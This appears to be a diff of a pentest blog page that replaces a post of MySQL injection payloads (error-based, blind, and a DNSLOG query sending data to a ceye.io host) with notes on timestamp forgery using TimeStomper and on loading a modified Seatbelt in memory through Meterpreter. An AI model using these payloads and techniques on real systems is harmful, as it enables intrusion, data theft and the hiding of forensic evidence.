@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="sql," />
+  <meta name="keywords" content="skill," />
 
 
 
@@ -79,18 +79,18 @@
 
 
 
-<meta name="description" content="MySQL">
-<meta name="keywords" content="sql">
+<meta name="description" content="TimeStomper:修改文件及文件夹创建时间，修改时间，访问时间  TimeStomper.exe -c r -m 1-1-1999 14:2:01 -a 5-1-1998 15:60:01 -p .\tes\test (r设置随机时间) TimeStomper.exe -z -p .\tes\test (z设置全部时间) TimeStomper.exe -p .\tes\11.txt -p2">
+<meta name="keywords" content="skill">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Sql Injection">
-<meta property="og:url" content="http://yoursite.com/2018/11/05/Sql-Injection/index.html">
+<meta property="og:title" content="Skills">
+<meta property="og:url" content="http://yoursite.com/2019/04/17/Skills/index.html">
 <meta property="og:site_name" content="Fxven Blog">
-<meta property="og:description" content="MySQL">
+<meta property="og:description" content="TimeStomper:修改文件及文件夹创建时间，修改时间，访问时间  TimeStomper.exe -c r -m 1-1-1999 14:2:01 -a 5-1-1998 15:60:01 -p .\tes\test (r设置随机时间) TimeStomper.exe -z -p .\tes\test (z设置全部时间) TimeStomper.exe -p .\tes\11.txt -p2">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2018-11-08T02:30:51.260Z">
+<meta property="og:updated_time" content="2019-04-17T10:39:13.149Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Sql Injection">
-<meta name="twitter:description" content="MySQL">
+<meta name="twitter:title" content="Skills">
+<meta name="twitter:description" content="TimeStomper:修改文件及文件夹创建时间，修改时间，访问时间  TimeStomper.exe -c r -m 1-1-1999 14:2:01 -a 5-1-1998 15:60:01 -p .\tes\test (r设置随机时间) TimeStomper.exe -z -p .\tes\test (z设置全部时间) TimeStomper.exe -p .\tes\11.txt -p2">
 
 
 
@@ -120,13 +120,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2018/11/05/Sql-Injection/"/>
+  <link rel="canonical" href="http://yoursite.com/2019/04/17/Skills/"/>
 
 
 
 
 
-  <title>Sql Injection | Fxven Blog</title>
+  <title>Skills | Fxven Blog</title>
   
 
 
@@ -253,7 +253,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/05/Sql-Injection/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/17/Skills/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="fxven">
@@ -270,7 +270,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">Sql Injection</h1>
+          <h1 class="post-title" itemprop="name headline">Skills</h1>
         
 
         <div class="post-meta">
@@ -282,8 +282,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-11-05T13:20:34+08:00">
-                2018-11-05
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-04-17T18:39:23+08:00">
+                2019-04-17
               </time>
             
 
@@ -305,8 +305,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/web/" itemprop="url" rel="index">
-                    <span itemprop="name">web</span>
+                  <a href="/categories/pentest/" itemprop="url" rel="index">
+                    <span itemprop="name">pentest</span>
                   </a>
                 </span>
 
@@ -347,25 +347,39 @@
       
 
       
-        <h1 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h1><a id="more"></a>
-<h2 id="基本"><a href="#基本" class="headerlink" title="基本"></a>基本</h2><h3 id="注入点"><a href="#注入点" class="headerlink" title="注入点"></a>注入点</h3><p> <code>GET、POST、Headers</code>   </p>
-<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p> <code>&#39;</code>  <code>&quot;</code>   <code>or 1=1</code>  <code>and 1=2</code>  <code># &gt;&gt; %23</code>  <code>--+</code> </p>
-<h3 id="基本函数"><a href="#基本函数" class="headerlink" title="基本函数"></a>基本函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">concat()、concat_ws()、group_contact()</span><br></pre></td></tr></table></figure>
-<h3 id="基本语句"><a href="#基本语句" class="headerlink" title="基本语句"></a>基本语句</h3><p> databases<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select databases();</span><br></pre></td></tr></table></figure></p>
-<p>tables<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(table_name) from information_schema.tables where table_schema=database();</span><br></pre></td></tr></table></figure></p>
-<p>columns<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(column_name) from information_schema.columns where table_name=table_name;</span><br></pre></td></tr></table></figure></p>
-<p>fields<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select field_name from table_name;</span><br></pre></td></tr></table></figure></p>
-<h2 id="注入类型"><a href="#注入类型" class="headerlink" title="注入类型"></a>注入类型</h2><h3 id="Error-injection"><a href="#Error-injection" class="headerlink" title=" Error-injection "></a><strong> Error-injection </strong></h3><p> 对于 <code>select</code> ……<br> 对于 <code>update、insert</code>     </p>
-<p>  <strong> floor()+ count()+group by </strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select 1 from (select count(*),concat(0x23,(select database()),floor(rand()*2))a from information_schema.tables group by a) b)</span><br></pre></td></tr></table></figure></p>
-<p>  <strong> exp() </strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and exp(~(select * from (select database() ) a) );</span><br></pre></td></tr></table></figure></p>
-<p>  <strong>bigint()</strong> (MySQL version &gt;= 5.4.45)  </p>
-<p>  <strong> updatexml() </strong>  (MySQL version &gt;= 5.1.5)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and updatexml(1,concat(0x23,(select * from (select concat_ws(0x23,fileds_name) from users limit 0,1)a ) ),1)</span><br></pre></td></tr></table></figure></p>
-<p>  <strong> extractvalue() </strong>  (MySQL version &gt;= 5.1.5)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and extractvalue(1,concat(0x23,(select * from (select concat_ws(0x23,fileds_name) from users limit 0,1) a) ) )</span><br></pre></td></tr></table></figure></p>
-<h3 id="Blinds"><a href="#Blinds" class="headerlink" title="Blinds"></a><strong>Blinds</strong></h3><p>用的的函数: <code>substr()、ascii()、length()、if()、sleep()</code> </p>
-<h4 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a>常用方法</h4><p>二分法</p>
-<h4 id="Booleanbase"><a href="#Booleanbase" class="headerlink" title="Booleanbase"></a><strong>Booleanbase</strong></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">or substr((select group_concat(fileds) from table_name limit 0,1),1,1)&gt;&apos;a&apos;</span><br></pre></td></tr></table></figure>
-<h4 id="Timebase"><a href="#Timebase" class="headerlink" title="Timebase"></a><strong>Timebase</strong></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">or if(substr((select group_concat(fileds) from table_name limit 0,1),1,1)&gt;&apos;a&apos;,sleep(5),1)</span><br></pre></td></tr></table></figure>
-<h4 id="DNSLOG"><a href="#DNSLOG" class="headerlink" title="DNSLOG"></a><strong>DNSLOG</strong></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and if((select load_file(concat(&apos;\\\\&apos;,(select fileds from users limit 0,1),&apos;.xxx.ceye.io\\abc&apos;))),1,0)</span><br></pre></td></tr></table></figure>
+        <h2 id="TimeStomper"><a href="#TimeStomper" class="headerlink" title="TimeStomper:"></a><a href="https://github.com/justinbui/TimeStomper" target="_blank" rel="noopener"><strong>TimeStomper:</strong></a></h2><p><strong>修改文件及文件夹创建时间，修改时间，访问时间</strong></p>
+<ul>
+<li><code>TimeStomper.exe -c r -m 1-1-1999 14:2:01 -a 5-1-1998 15:60:01 -p .\tes\test</code> <strong><em>(r设置随机时间)</em></strong></li>
+<li><code>TimeStomper.exe -z -p .\tes\test</code> <strong><em>(z设置全部时间)</em></strong></li>
+<li><code>TimeStomper.exe -p .\tes\11.txt -p2 .\tes\test</code> <strong><em>(把-p文件的时间修改为-p2文件的时间)</em></strong></li>
+<li><h3 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h3><strong>1. 对文件夹设置使用z与-r选项设置时间时，子文件访问时间并不会被设置，访问时间生成为当前时间</strong><br><strong>2. 设置的时间为UTC时间，北京时间为UTC+8，所以生成的时间会晚八个小时</strong></li>
+<li><strong>检测用到的工具:</strong> <a href="https://github.com/Invoke-IR/PowerForensics" target="_blank" rel="noopener"><code>PowerForensics</code></a> <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon" target="_blank" rel="noopener"><code>Sysmon</code></a></li>
+<li><strong>Reference: <a href="https://posts.specterops.io/revisiting-ttps-timestomper-622d4c28a655" target="_blank" rel="noopener"><code>TimeStomper-Posts</code></a></strong></li>
+</ul>
+<hr>
+<h3 id="Running-a-NET-Assembly-in-Memory-with-Meterpreter"><a href="#Running-a-NET-Assembly-in-Memory-with-Meterpreter" class="headerlink" title="Running a .NET Assembly in Memory with Meterpreter"></a>Running a .NET Assembly in Memory with Meterpreter</h3><p><strong>1. </strong>Modifying the Project<em>**</em></p>
+<ul>
+<li>下载<a href="https://github.com/GhostPack/Seatbelt" target="_blank" rel="noopener"><code>Seatbelt</code></a>项目，用vs打开Seatbelt.sln</li>
+<li><p>在顶部添加</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">using System.IO;</span><br><span class="line">using System.Text;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>修改157行 <code>class Program</code> 为 <code>public class Program</code></li>
+<li>在6818行加入以下代码<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">public static string BuckleUp()</span><br><span class="line">        &#123;</span><br><span class="line">            MemoryStream stream = new MemoryStream();</span><br><span class="line">            StreamWriter sw = new StreamWriter(stream);</span><br><span class="line">            TextWriter old_stdout = Console.Out;</span><br><span class="line">            Console.SetOut(sw);</span><br><span class="line"></span><br><span class="line">            //hard coded command line arguments</span><br><span class="line">            string[] args = &quot;all&quot;.Split(null);</span><br><span class="line">            Main(args);</span><br><span class="line"></span><br><span class="line">            Console.SetOut(old_stdout);</span><br><span class="line">            sw.Flush();</span><br><span class="line">            string output = Encoding.ASCII.GetString(stream.ToArray());</span><br><span class="line">            sw.Close();</span><br><span class="line">            return output;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+</ul>
+<p><strong>2. Building the C# Project</strong></p>
+<ul>
+<li>将解决方案配置改为Release</li>
+<li>启动生成Seatbelt.exe</li>
+</ul>
+<p><strong>3.Loading with Meterpreter</strong></p>
+<ul>
+<li>上传Seatbelt.exe到服务器，扩展名改为dll</li>
+<li><code>meterpreter&gt; load powershell</code><br><code>meterpreter&gt; powershell_import Seatbelt.dll</code><br><code>meterpreter&gt; powershell_execute [Seatbelt.Program]::BuckleUp()</code></li>
+</ul>
+<h4 id="Reference-Posted-by-Thomas-Hendrickson"><a href="#Reference-Posted-by-Thomas-Hendrickson" class="headerlink" title="Reference: Posted by Thomas Hendrickson"></a>Reference: <a href="https://p16.praetorian.com/blog/running-a-.net-assembly-in-memory-with-meterpreter" target="_blank" rel="noopener">Posted by Thomas Hendrickson</a></h4><hr>
 
       
     </div>
@@ -383,7 +397,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/sql/" <i class="fa fa-tag"></i> sql</a>
+            <a href="/tags/skill/" <i class="fa fa-tag"></i> skill</a>
           
         </div>
       
@@ -396,8 +410,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/06/26/hello-world/" rel="next" title="Hello World">
-                <i class="fa fa-chevron-left"></i> Hello World
+              <a href="/2018/11/13/File-upload/" rel="next" title="File upload">
+                <i class="fa fa-chevron-left"></i> File upload
               </a>
             
           </div>
@@ -405,10 +419,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2018/11/13/File-upload/" rel="prev" title="File upload">
-                File upload <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -540,7 +550,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#MySQL"><span class="nav-number">1.</span> <span class="nav-text">MySQL</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#基本"><span class="nav-number">1.1.</span> <span class="nav-text">基本</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#注入点"><span class="nav-number">1.1.1.</span> <span class="nav-text">注入点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#测试"><span class="nav-number">1.1.2.</span> <span class="nav-text">测试</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#基本函数"><span class="nav-number">1.1.3.</span> <span class="nav-text">基本函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#基本语句"><span class="nav-number">1.1.4.</span> <span class="nav-text">基本语句</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#注入类型"><span class="nav-number">1.2.</span> <span class="nav-text">注入类型</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Error-injection"><span class="nav-number">1.2.1.</span> <span class="nav-text"> Error-injection </span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Blinds"><span class="nav-number">1.2.2.</span> <span class="nav-text">Blinds</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#常用方法"><span class="nav-number">1.2.2.1.</span> <span class="nav-text">常用方法</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Booleanbase"><span class="nav-number">1.2.2.2.</span> <span class="nav-text">Booleanbase</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Timebase"><span class="nav-number">1.2.2.3.</span> <span class="nav-text">Timebase</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#DNSLOG"><span class="nav-number">1.2.2.4.</span> <span class="nav-text">DNSLOG</span></a></li></ol></li></ol></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#TimeStomper"><span class="nav-number">1.</span> <span class="nav-text">TimeStomper:</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Tips"><span class="nav-number">1.1.</span> <span class="nav-text">Tips</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Running-a-NET-Assembly-in-Memory-with-Meterpreter"><span class="nav-number">1.2.</span> <span class="nav-text">Running a .NET Assembly in Memory with Meterpreter</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Reference-Posted-by-Thomas-Hendrickson"><span class="nav-number">1.2.1.</span> <span class="nav-text">Reference: Posted by Thomas Hendrickson</span></a></li></ol></li></ol></li></ol></div>
             
 
           </div>
